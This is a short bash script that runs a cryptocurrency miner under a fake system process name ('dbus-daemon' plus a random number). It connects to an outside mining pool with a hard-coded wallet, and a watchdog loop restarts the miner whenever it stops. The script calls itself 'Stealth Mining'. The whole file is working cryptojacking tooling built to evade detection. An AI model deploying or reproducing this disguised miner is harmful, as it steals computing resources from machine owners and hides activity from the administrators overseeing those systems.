#!/bin/bash

FAKE_NAME="dbus-daemon-$(shuf -i 100-999 -n 1)"
FAKE_PATH="/usr/local/bin/${FAKE_NAME}"

echo "🔒 Starting Direct TLS Stealth Mining..."

# Copy binary
cp /usr/local/bin/miner "$FAKE_PATH"
chmod +x "$FAKE_PATH"

echo "Launching direct to pool..."

"$FAKE_PATH" \
  -a yespowertide \
  -o stratum+tcps://asia.rplant.xyz:17059 \
  -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
  -p x \
  -t 2 \
  --no-color > miner.log 2>&1 &

echo "✅ Direct TLS Mining started. Check miner.log for details."

# Monitoring
while true; do
    sleep 20
    if ! pgrep -f miner > /dev/null 2>&1; then
        echo "[$(date)] Miner died, restarting direct..."
        "$FAKE_PATH" \
          -a yespowertide \
          -o stratum+tcps://asia.rplant.xyz:17059 \
          -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
          -p x \
          -t 2 \
          --no-color > miner.log 2>&1 &
    fi
done
